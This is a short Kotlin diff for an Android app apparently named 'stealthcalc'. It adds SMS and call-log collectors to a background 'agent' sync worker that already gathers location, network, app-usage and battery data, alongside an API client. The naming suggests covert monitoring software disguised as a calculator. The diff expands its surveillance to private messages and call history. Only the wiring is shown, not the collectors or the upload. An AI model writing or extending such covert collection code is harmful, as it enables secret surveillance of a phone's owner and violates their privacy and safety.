@@ -10,8 +10,10 @@ import androidx.work.WorkerParameters
 import com.stealthcalc.core.logging.AppLogger
 import com.stealthcalc.monitoring.collector.AppUsageCollector
 import com.stealthcalc.monitoring.collector.BatteryCollector
+import com.stealthcalc.monitoring.collector.CallLogCollector
 import com.stealthcalc.monitoring.collector.LocationCollector
 import com.stealthcalc.monitoring.collector.NetworkCollector
+import com.stealthcalc.monitoring.collector.SmsCollector
 import com.stealthcalc.monitoring.data.MonitoringRepository
 import com.stealthcalc.monitoring.network.AgentApiClient
 import dagger.assisted.Assisted
@@ -27,6 +29,8 @@ class AgentSyncWorker @AssistedInject constructor(
     private val batteryCollector: BatteryCollector,
     private val networkCollector: NetworkCollector,
     private val locationCollector: LocationCollector,
+    private val callLogCollector: CallLogCollector,
+    private val smsCollector: SmsCollector,
     private val apiClient: AgentApiClient,
 ) : CoroutineWorker(context, params) {
 
@@ -56,6 +60,8 @@ class AgentSyncWorker @AssistedInject constructor(
             batteryCollector.collect()
             networkCollector.collectSnapshot()
             locationCollector.collect()
+            callLogCollector.collect()
+            smsCollector.collect()
         }.onFailure { e ->
             AppLogger.log(applicationContext, "[agent]", "Worker collection error: ${e.message}")
         }
